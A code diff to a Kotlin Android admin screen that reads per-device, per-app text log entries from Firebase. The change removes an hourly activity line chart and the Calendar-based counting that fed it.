@@ -19,7 +19,6 @@ import com.google.firebase.database.DatabaseError
 import com.google.firebase.database.FirebaseDatabase
 import com.google.firebase.database.ValueEventListener
 import java.text.SimpleDateFormat
-import java.util.Calendar
 import java.util.Date
 import java.util.Locale
 
@@ -28,7 +27,6 @@ class AdminMainActivity : AppCompatActivity() {
     private lateinit var recyclerView: RecyclerView
     private lateinit var txtTotalDevices: TextView
     private lateinit var txtTotalEvents: TextView
-    private lateinit var lineChartView: LineChartView
 
     private val deviceList = mutableListOf<DeviceModel>()
     private lateinit var adapter: DeviceAdapter
@@ -58,7 +56,6 @@ class AdminMainActivity : AppCompatActivity() {
 
         txtTotalDevices = findViewById<TextView>(R.id.txtTotalDevices)
         txtTotalEvents = findViewById<TextView>(R.id.txtTotalEvents)
-        lineChartView = findViewById<LineChartView>(R.id.lineChartView)
 
         val btnRefresh = findViewById<Button>(R.id.btnRefreshDevices)
         btnRefresh.setOnClickListener {
@@ -92,9 +89,6 @@ class AdminMainActivity : AppCompatActivity() {
         dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val allEntries = mutableListOf<LogEntry>()
-                val hourlyCounts = FloatArray(24) { 0f }
-                val calendar = Calendar.getInstance()
-                val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
 
                 for (child in snapshot.children) {
                     val deviceName = child.key ?: continue
@@ -116,14 +110,6 @@ class AdminMainActivity : AppCompatActivity() {
                             val timestampMillis = entry.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
                             if (text.isNotBlank() && text != "null") {
                                 allEntries.add(LogEntry(timestampMillis, prettyApp, text))
-
-                                calendar.timeInMillis = timestampMillis
-                                if (calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear) {
-                                    val hour = calendar.get(Calendar.HOUR_OF_DAY)
-                                    if (hour in 0..23) {
-                                        hourlyCounts[hour]++
-                                    }
-                                }
                             }
                         }
                     }
@@ -132,11 +118,6 @@ class AdminMainActivity : AppCompatActivity() {
                 txtTotalDevices.text = deviceList.size.toString()
                 txtTotalEvents.text = allEntries.size.toString()
                 adapter.notifyDataSetChanged()
-
-                // Update Line Chart for Today's Activity Trend
-                val chartPoints = hourlyCounts.toList()
-                val timeLabels = listOf("12AM", "3AM", "6AM", "9AM", "12PM", "3PM", "6PM", "9PM")
-                lineChartView.setData(chartPoints, timeLabels)
             }
 
             override fun onCancelled(error: DatabaseError) {}
